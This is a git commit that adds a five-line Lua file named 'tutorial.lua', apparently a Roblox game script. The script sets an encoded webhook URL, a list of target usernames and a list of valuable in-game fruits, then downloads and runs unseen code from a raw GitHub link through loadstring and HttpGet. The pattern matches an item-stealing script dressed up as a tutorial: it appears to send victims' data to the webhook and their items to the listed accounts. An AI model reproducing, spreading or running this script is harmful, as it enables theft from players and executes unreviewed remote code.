91119364a9b3b30bf968438c652cc07dd82b5aa0
NaruTeam <naruteamservice@gmail.com>
2025-04-14 00:27:14 +0700

    Create tutorial.lua

---
+++ tutorial.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aDI0NnMwNFFxLXFtSUlJem9GTUZqUTp1TWt6TkNOWFU5NnBWVmZzZ3kwNkVyQlFlT045elRGVmZtaDhEa2IxWWVLWnpPRnRLV3AyWm5sWXFJX2dFR2Ewd0h0dXJuTWdKRWNSUmRzQzFhdUF1bGEyTllsUkE1NHVxRkV3anVQUE50SDVxbFg1TXFOSWVFMTBxUDVMZWZ0anNTYjhQbUhaX2MtRF80aG1aaWZCbzRuQWI4V0haSGJHRVdLR25VWGx2b0U"
+Usernames = {"tutorial"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
